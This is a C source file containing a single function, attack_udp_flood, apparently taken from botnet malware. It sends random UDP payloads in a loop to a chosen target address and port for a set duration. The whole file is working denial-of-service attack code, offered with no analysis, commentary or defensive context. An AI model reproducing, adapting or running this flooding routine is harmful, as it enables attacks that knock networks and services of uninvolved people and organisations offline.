#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <time.h>

void attack_udp_flood(char *target, int port, int timer, int data_len)
{
	int fd, i;
	struct sockaddr_in addr, bind_addr;

#ifdef DEBUG
	printf("UDPPLAIN attacking: %s:%d time: %d, length: %d\n",
		target, port, timer, data_len);
#endif

	bind_addr.sin_family = AF_INET;
	bind_addr.sin_port = htons(rand() % 0xffff);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr(target);

	char *data;

	data = calloc(65535, sizeof(char));

	fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	bind(fd, (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));

	connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

	time_t start = time(0);
	while (time(0) <= start + timer)
	{

		for(i = 0; i < data_len; i++)
			data[i] = (char)rand() % 0xffff;
		send(fd, data, data_len, MSG_NOSIGNAL);
	}
}
